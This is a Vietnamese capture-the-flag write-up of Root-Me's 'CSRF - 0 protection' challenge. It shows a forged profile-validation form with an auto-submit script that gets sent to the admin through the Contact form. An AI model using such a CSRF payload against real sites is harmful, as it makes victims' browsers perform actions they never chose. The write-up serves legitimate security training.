# [CSRF - 0 protection](https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection)

Tạo tài khoản và login vào website:

![](./media/image1.png)

Ở tab Profile, khi ta thực hiện submit thử thì nhận được message:

![](./media/image2.png)

Ở tab Contact, ta có thể thấy form với `method=“post”`, submit thử thì ta nhận được message:

![](./media/image3.png)

Qua tab Private, ta thấy message:

![](./media/image4.png)

Từ đó, ta có thể đoán ra rằng, nội dung ở tab Contact sẽ được post lên và được admin kiểm duyệt Admin có thể click vào message của ta Có thể tấn công CSRF.

Để xem được tab Private, ta cần phải xác thực được Profile và từ đó ta có thể đoán được ý đồ của việc disable của nút Status là có lý do của nó. Tuy vậy, chỉ có admin mới có thể xác thực account. Kết hợp với suy luận ở trên, ta có thể thực hiện CSRF giả mạo gửi content đến cho admin và khiến script chạy để admin submit form cho ta.

Qua tab Profile, inspect element và thực hiện giả mạo một form tương tự form ở tab Profile. Sau đó, chèn thêm script để admin có thể submit form:

```html
<form id="clickme" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data"></form>

<input type="text" name="username" value="19522445">

<input type="checkbox" name="status" checked>

</form>

<script>document.getElementById("clickme").submit();</script>
```

![](./media/image5.png)

Submit để gửi contact đến admin và qua tab Private để kiểm tra kết quả. Sau hơn 1 phút, ta nhận được flag:

![](./media/image6.png)

- Flag: "****************************"
